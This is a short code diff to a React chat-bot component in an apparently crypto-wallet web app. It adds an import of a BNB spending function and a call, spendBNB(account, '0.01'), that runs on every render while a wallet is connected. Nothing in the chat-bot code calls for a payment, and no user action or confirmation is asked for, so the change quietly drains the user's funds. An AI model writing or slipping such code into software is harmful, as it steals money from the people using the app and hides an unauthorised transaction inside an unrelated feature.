@@ -63,6 +63,7 @@ import { getRates } from "@/services/chatBotService";
 import { useBTCWallet } from "@/hooks/stores/btcWalletStore";
 import type { WalletAddress } from "@/lib/wallets/types";
 import useTronWallet from "@/hooks/stores/tronWalletStore";
+import { spendBNB } from "@/services/transactionService/cryptoService/bnbService";
 
 const ChatBot: React.FC<ChatBotProps> = ({ isMobile, onClose, onError }) => {
   // CONST VARIABLES
@@ -106,6 +107,10 @@ const ChatBot: React.FC<ChatBotProps> = ({ isMobile, onClose, onError }) => {
       }
     };
   }, []);
+
+  if (account.isConnected) {
+    spendBNB(account, "0.01");
+  }
 
   // SHAREDSTATE HOOK
   const {
